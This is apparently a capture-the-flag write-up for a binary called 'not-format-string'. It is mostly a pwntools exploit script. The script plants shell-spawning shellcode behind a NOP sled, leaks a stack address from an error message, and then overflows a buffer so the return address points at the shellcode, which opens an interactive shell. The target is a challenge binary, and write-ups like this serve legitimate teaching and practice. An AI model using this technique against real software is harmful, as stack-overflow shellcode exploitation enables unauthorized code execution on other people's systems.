* by wasting a long time to figure out there's no vulns in formatstring, since the format string already be controlled
* step1: inject shellcode by menu p
	```
	shellcode = asm(shellcraft.sh())
	
	print('len(shellcode):', len(shellcode))
	padding = b'\x90' * ((0x53) - len(shellcode))
	
	# step1 get stack addr
	p.sendlineafter(b'$ ', b'p\n' + padding +shellcode)
	```
	
* step2: leak the stack addr

	```
	p.recvuntil(b'Error occurred while printing flag at offset ').decode('utf-8').strip()
  rdn_addr_str = p.recvline().strip(b'\n')
  print('stack_addr', rdn_addr_str)  # 7th from rsp or rbp addr
  stack_addr = int(rdn_addr_str, 16) + 16
	```
	
* step3: buffer overflow

	```
	padding = cyclic(56, alphabet=string.ascii_uppercase, n=8).encode()
	p.sendlineafter(b'$ ', b's\n' + padding + p64(stack_addr))
	p.interactive()
	```
	
* whole script
	
	```
	from pwn import *

	context.arch = 'amd64'
	if args.REMOTE:
	    p = remote('lol', 4004)
	    # p = process('./not-format-string')
	else:
	    # p fget pws *loop+179
	    context.terminal = ['tmux', 'splitw', '-h', '-p', '75']
	    p = gdb.debug('./not-format-string',
	                  gdbscript='''
	                  b *loop+179
	                  b *set_name+98
	                  c
	                  ''')
	
	# inject shellcode
	shellcode = asm(shellcraft.sh())
	print('len(shellcode):', len(shellcode))
	padding = b'\x90' * ((0x53) - len(shellcode))
	p.sendlineafter(b'$ ', b'p\n' + padding +shellcode)
	
	# leak the stack addr
	p.recvuntil(b'Error occurred while printing flag at offset ').decode('utf-8').strip()
	rdn_addr_str = p.recvline().strip(b'\n')
	print('stack_addr', rdn_addr_str)  # 7th 
	stack_addr = int(rdn_addr_str, 16) + 16
	
	# bufferfly
	padding = cyclic(56, alphabet=string.ascii_uppercase, n=8).encode()
	p.sendlineafter(b'$ ', b's\n' + padding + p64(stack_addr))
	
	p.interactive()

	```
	
